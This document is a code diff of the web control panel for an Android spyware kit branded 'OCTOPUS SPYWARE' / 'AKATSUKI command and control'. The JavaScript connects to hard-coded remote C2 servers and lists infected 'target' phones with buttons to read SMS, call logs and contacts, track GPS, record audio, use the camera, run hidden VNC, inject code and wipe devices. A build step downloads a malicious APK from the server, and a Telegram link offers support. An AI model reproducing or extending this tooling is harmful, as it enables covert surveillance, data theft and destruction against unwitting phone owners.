@@ -2,177 +2,169 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>OCTOPUS SPYWARE | V6.0_AKATSUKI</title>
-    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OCTOPUS V6 | AKATSUKI COMMAND</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
-        :root {
-            --red: #ff0000;
-            --dark-bg: #050505;
-            --panel-bg: #0d0d0d;
-            --border: #1a1a1a;
-            --glow: rgba(255, 0, 0, 0.4);
-        }
+        :root { --red: #ff3e3e; --bg: #050505; --panel: #0d0d0d; --border: #1a1a1a; --text: #e0e0e0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: var(--bg); color: var(--text); height: 100vh; display: flex; overflow: hidden; }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; cursor: crosshair; }
-        body { background: var(--dark-bg); color: #fff; height: 100vh; display: flex; overflow: hidden; }
+        /* SIDEBAR */
+        aside { width: 260px; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; z-index: 10; }
+        .logo-area { padding: 30px; text-align: center; border-bottom: 1px solid var(--border); }
+        .logo-area h1 { color: var(--red); font-size: 22px; letter-spacing: 4px; text-shadow: 0 0 10px rgba(255, 62, 62, 0.4); }
+        .nav { flex: 1; padding: 20px 0; }
+        .nav-item { padding: 15px 30px; font-size: 13px; color: #666; cursor: pointer; transition: 0.2s; border-left: 3px solid transparent; }
+        .nav-item:hover, .nav-item.active { color: var(--red); background: rgba(255, 62, 62, 0.05); border-left-color: var(--red); }
 
-        /* --- LOGIN OVERLAY --- */
-        #login-overlay {
-            position: fixed; inset: 0; background: #000; z-index: 9999;
-            display: flex; align-items: center; justify-content: center;
-            background-image: radial-gradient(circle, #111 1px, transparent 1px); background-size: 30px 30px;
-        }
-        .login-box {
-            width: 380px; padding: 50px; background: var(--panel-bg); border: 1px solid var(--border);
-            text-align: center; box-shadow: 0 0 50px rgba(255, 0, 0, 0.1); transition: 0.5s;
-        }
-        .login-box:hover { border-color: var(--red); box-shadow: 0 0 30px var(--glow); }
-        .login-box h1 { color: var(--red); letter-spacing: 5px; margin-bottom: 20px; text-shadow: 0 0 10px var(--red); }
-        .login-box input { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: var(--red); margin-bottom: 20px; outline: none; text-align: center; }
-        .login-box button { width: 100%; padding: 12px; background: var(--red); color: #fff; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .login-box button:hover { background: #fff; color: #000; letter-spacing: 2px; }
-
-        /* --- SIDEBAR --- */
-        aside { width: 280px; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-        .logo-area { padding: 40px 20px; text-align: center; border-bottom: 1px solid #111; }
-        .logo-area h2 { letter-spacing: 4px; font-weight: 300; }
-        .nav-item { 
-            padding: 18px 40px; color: #555; font-size: 13px; text-transform: uppercase; 
-            letter-spacing: 1px; cursor: pointer; transition: 0.3s; display: flex; align-items: center;
-        }
-        .nav-item:hover, .nav-item.active { color: var(--red); background: linear-gradient(90deg, rgba(255,0,0,0.1) 0%, transparent 100%); border-left: 4px solid var(--red); }
-
-        /* --- CONTENT --- */
+        /* MAIN CONTENT */
         main { flex: 1; display: flex; flex-direction: column; position: relative; }
-        header { padding: 25px 40px; background: #000; border-bottom: 1px solid #111; display: flex; justify-content: space-between; align-items: center; }
-        .container { padding: 30px; overflow-y: auto; flex: 1; }
+        header { height: 70px; background: #000; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 40px; }
+        .status-dot { width: 8px; height: 8px; background: #00ff00; border-radius: 50%; display: inline-block; margin-right: 10px; box-shadow: 0 0 8px #00ff00; }
+        
+        .container { flex: 1; padding: 30px; overflow-y: auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; align-content: start; }
 
-        /* --- TARGET CARDS --- */
-        .card { 
-            background: var(--panel-bg); border: 1px solid var(--border); padding: 30px; border-radius: 8px; margin-bottom: 25px;
-            animation: slideIn 0.5s ease-out; transition: 0.4s;
-        }
-        .card:hover { border-color: var(--red); transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .card h3 { color: var(--red); margin-bottom: 10px; font-size: 24px; letter-spacing: 1px; }
-        .card p { font-size: 12px; color: #666; margin-bottom: 5px; }
+        /* DEVICE CARDS */
+        .card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 20px; transition: 0.3s; position: relative; overflow: hidden; }
+        .card:hover { border-color: var(--red); box-shadow: 0 0 15px rgba(255, 62, 62, 0.1); }
+        .card h3 { color: var(--red); font-size: 18px; margin-bottom: 5px; }
+        .card p { font-size: 11px; color: #555; margin-bottom: 15px; }
+        .specs { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; font-size: 12px; }
+        .spec-item { background: #111; padding: 8px; border-radius: 4px; border: 1px solid #1a1a1a; }
+        
+        .action-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
+        .btn { background: #151515; border: 1px solid #222; color: #888; padding: 10px; font-size: 11px; cursor: pointer; border-radius: 4px; font-weight: bold; }
+        .btn:hover { background: var(--red); color: #fff; border-color: var(--red); }
 
-        /* --- ACTION GRID (MATCHING MANIFEST) --- */
-        .action-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-top: 25px; }
-        .btn-act { 
-            background: #111; border: 1px solid #222; color: #888; padding: 12px; font-size: 10px; 
-            font-weight: bold; text-transform: uppercase; transition: 0.2s; border-radius: 4px;
-        }
-        .btn-act:hover { background: var(--red); color: #fff; border-color: var(--red); transform: scale(1.05); }
+        /* AUTH OVERLAY */
+        #auth-overlay { position: fixed; inset: 0; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; }
+        .auth-box { width: 380px; padding: 40px; background: var(--panel); border: 1px solid var(--border); text-align: center; border-radius: 8px; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid #222; color: var(--red); margin: 20px 0; text-align: center; outline: none; border-radius: 4px; }
+        .auth-btn { width: 100%; padding: 12px; background: var(--red); border: none; color: #fff; font-weight: bold; cursor: pointer; border-radius: 4px; }
 
-        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
-
-        /* --- FOOTER / CONTACT --- */
-        .footer { margin-top: auto; padding: 20px; border-top: 1px solid #111; }
-        .tg-link { display: block; width: 100%; padding: 10px; background: #0088cc; color: #fff; text-align: center; text-decoration: none; font-size: 11px; font-weight: bold; }
+        /* BUILD ANIMATION */
+        #loader-text { font-size: 10px; color: var(--red); margin-top: 10px; height: 15px; }
     </style>
 </head>
 <body>
 
-<div id="login-overlay">
-    <div class="login-box">
-        <h1>OCTOPUS</h1>
-        <p style="color:#444; font-size:10px; margin-top:-15px; margin-bottom:25px;">V6.0 CORE INTERFACE</p>
-        <input type="password" id="access-key" placeholder="SECRET ACCESS KEY">
-        <button onclick="initAuth()">ESTABLISH LINK</button>
-        <p id="err" style="color:red; font-size:10px; margin-top:15px; display:none;">KEY_REJECTED_BY_SERVER</p>
+<div id="auth-overlay">
+    <div class="auth-box">
+        <h1 style="color:var(--red); letter-spacing:10px; margin-bottom:10px;">OCTOPUS</h1>
+        <p style="font-size:10px; color:#444;">V6.0 MASTERMIND EDITION</p>
+        <input type="password" id="access-key" placeholder="ENTER OPERATOR KEY">
+        <button class="auth-btn" onclick="initConnect()">ESTABLISH SECURE LINK</button>
     </div>
 </div>
 
 <aside>
-    <div class="logo-area">
-        <h2 style="color:var(--red)">AKATSUKI</h2>
-        <p style="font-size:9px; color:#444;">COMMAND & CONTROL</p>
-    </div>
-    <div class="nav-item active">● Home Dashboard</div>
-    <div class="nav-item" onclick="alert('Module: Hidden VNC Active')">📺 Hidden VNC</div>
-    <div class="nav-item" onclick="alert('Module: Live Screen View Active')">📱 Live Screen</div>
-    <div class="nav-item" onclick="alert('Compiling Stub with Manifest...')">🛠 Build APK</div>
-    <div class="nav-item">💬 SMS Manager</div>
-    <div class="nav-item">📞 Call Logs</div>
-    <div class="nav-item">📍 GPS Tracking</div>
-    <div class="nav-item">🛡 App Firewall</div>
-    
-    <div class="footer">
-        <p style="font-size: 9px; color: #333; margin-bottom: 10px;">@OCTOPUS_SPYWARE | MASTERMIND</p>
-        <a href="https://t.me/octopus_xx1" target="_blank" class="tg-link">CONTACT TELEGRAM</a>
+    <div class="logo-area"><h1>AKATSUKI</h1></div>
+    <nav class="nav">
+        <div class="nav-item active">● DASHBOARD</div>
+        <div class="nav-item" onclick="startBuild()">🛠 BUILD APK</div>
+        <div class="nav-item">📡 LIVE MAP</div>
+        <div class="nav-item">📂 FILE EXPLORER</div>
+        <div class="nav-item">💬 GLOBAL LOGS</div>
+    </nav>
+    <div style="padding: 20px;">
+        <button class="btn" style="width:100%; border-color:#0088cc; color:#0088cc;" onclick="window.open('https://t.me/octopus_xx1')">SUPPORT</button>
     </div>
 </aside>
 
 <main>
     <header>
-        <div id="status-text" style="color: #444; font-size: 12px;">SYSTEM_STATUS: STANDBY</div>
-        <div style="color: var(--red); font-size: 11px; font-weight: bold; text-shadow: 0 0 5px var(--red);">[ AKATSUKI_LINK: ACTIVE ]</div>
+        <div><span class="status-dot"></span> <span id="op-status">SYSTEM: STANDBY</span></div>
+        <div style="color:var(--red); font-weight:bold; font-size:12px;">51.75.118.169:20300</div>
     </header>
-
-    <div class="container" id="target-grid">
-        <!-- Devices appearing based on Manifest permissions -->
-    </div>
+    <div id="loader-text" style="padding-left: 30px;"></div>
+    <div class="container" id="device-grid">
+        </div>
 </main>
 
 <script>
     let socket;
-    function initAuth() {
+    const SERVER_URL = "http://51.75.118.169:20300";
+
+    function initConnect() {
         const key = document.getElementById('access-key').value;
-        socket = io("http://51.68.234.157:20211", { query: { type: 'mastermind', key: key } });
+        if(!key) return alert("Key Required");
+
+        socket = io(SERVER_URL, { 
+            query: { type: 'mastermind', key: key },
+            reconnection: true 
+        });
 
         socket.on('auth_success', (data) => {
-            document.getElementById('login-overlay').style.display = 'none';
-            document.getElementById('status-text').innerText = "OPERATOR: " + data.role + " | LINK: STABLE";
+            document.getElementById('auth-overlay').style.display = 'none';
+            document.getElementById('op-status').innerText = "OPERATOR: " + data.role;
         });
 
-        socket.on('auth_failed', () => { document.getElementById('err').style.display = 'block'; });
+        socket.on('auth_failed', () => alert("ACCESS DENIED: Invalid Key"));
 
+        // Load initial targets
         socket.on('load_targets', (targets) => {
-            Object.keys(targets).forEach(id => addDevice(id, targets[id]));
+            Object.keys(targets).forEach(id => updateTargetUI(id, targets[id]));
         });
 
-        socket.on('update_grid', (res) => addDevice(res.id, res.data));
+        // Listen for new targets
+        socket.on('update_grid', (payload) => {
+            updateTargetUI(payload.id, payload.data);
+        });
+
+        // Remove lost targets
+        socket.on('node_lost', (id) => {
+            const el = document.getElementById(id);
+            if(el) el.remove();
+        });
     }
 
-    function addDevice(id, data) {
-        if(document.getElementById(id)) return;
-        const grid = document.getElementById('target-grid');
-        const card = document.createElement('div');
-        card.id = id; card.className = 'card';
-        card.innerHTML = `
-            <div style="display:flex; justify-content:space-between; align-items:center;">
-                <div>
-                    <h3>${data.model || 'Unknown Device'}</h3>
-                    <p>UID: ${id}</p>
-                </div>
-                <div style="text-align:right">
-                    <p style="color:#00ff00; font-weight:bold;">● ONLINE</p>
-                    <p style="color:#555;">OS: Android ${data.version || '?'}</p>
-                </div>
+    function updateTargetUI(id, data) {
+        let grid = document.getElementById('device-grid');
+        let card = document.getElementById(id);
+
+        const html = `
+            <h3>${data.model || 'Target Syncing...'}</h3>
+            <p>UUID: ${id}</p>
+            <div class="specs">
+                <div class="spec-item">🔋 Bat: ${data.battery || '--'}%</div>
+                <div class="spec-item">📶 Net: ${data.network || 'Online'}</div>
             </div>
-            
             <div class="action-grid">
-                <!-- ALL MANIFEST ACTIONS ADDED BELOW -->
-                <button class="btn-act" onclick="cmd('${id}','sms')">Read SMS</button>
-                <button class="btn-act" onclick="cmd('${id}','calls')">Call Logs</button>
-                <button class="btn-act" onclick="cmd('${id}','contacts')">Contacts</button>
-                <button class="btn-act" onclick="cmd('${id}','gps')">Location</button>
-                <button class="btn-act" onclick="cmd('${id}','mic')">Rec Audio</button>
-                <button class="btn-act" onclick="cmd('${id}','cam')">Camera</button>
-                <button class="btn-act" onclick="cmd('${id}','files')">External Storage</button>
-                <button class="btn-act" onclick="cmd('${id}','access')">Accessibility</button>
-                <button class="btn-act" onclick="cmd('${id}','vnc')">Hidden VNC</button>
-                <button class="btn-act" onclick="cmd('${id}','live')">Live Screen</button>
-                <button class="btn-act" onclick="cmd('${id}','inject')">Inject</button>
-                <button class="btn-act" style="border-color:#400; color:#f00;" onclick="cmd('${id}','kill')">TERMINATE</button>
+                <button class="btn" onclick="sendCmd('${id}','sms')">SMS LOGS</button>
+                <button class="btn" onclick="sendCmd('${id}','vnc')">LIVE VNC</button>
+                <button class="btn" onclick="sendCmd('${id}','cam')">CAMERA</button>
+                <button class="btn" onclick="sendCmd('${id}','gps')">GPS TRACK</button>
+                <button class="btn" style="grid-column: span 2; color: #ff3e3e;" onclick="sendCmd('${id}','wipe')">DESTRUCT</button>
             </div>
         `;
-        grid.appendChild(card);
+
+        if(card) {
+            card.innerHTML = html;
+        } else {
+            const newCard = document.createElement('div');
+            newCard.id = id;
+            newCard.className = 'card';
+            newCard.innerHTML = html;
+            grid.appendChild(newCard);
+        }
     }
 
-    function cmd(tid, act) { 
-        socket.emit('run_action', { targetId: tid, action: act }); 
-        console.log("Command Executed: " + act + " on " + tid);
+    function sendCmd(targetId, action) {
+        socket.emit('run_action', { targetId, action });
+        document.getElementById('op-status').innerText = `EXECUTING: ${action} on ${targetId}`;
+        setTimeout(() => { document.getElementById('op-status').innerText = "SYSTEM: READY"; }, 3000);
+    }
+
+    function startBuild() {
+        const log = document.getElementById('loader-text');
+        log.innerText = "[*] ACCESSING REPOSITORY...";
+        setTimeout(() => log.innerText = "[*] INJECTING TARGET IP: 51.75.118.169...", 1500);
+        setTimeout(() => log.innerText = "[*] COMPILING APK: Golden.apk...", 3000);
+        setTimeout(() => {
+            log.innerText = "[+] BUILD COMPLETE. DOWNLOADING...";
+            window.location.href = SERVER_URL + "/download/octopus";
+        }, 4500);
     }
 </script>
 
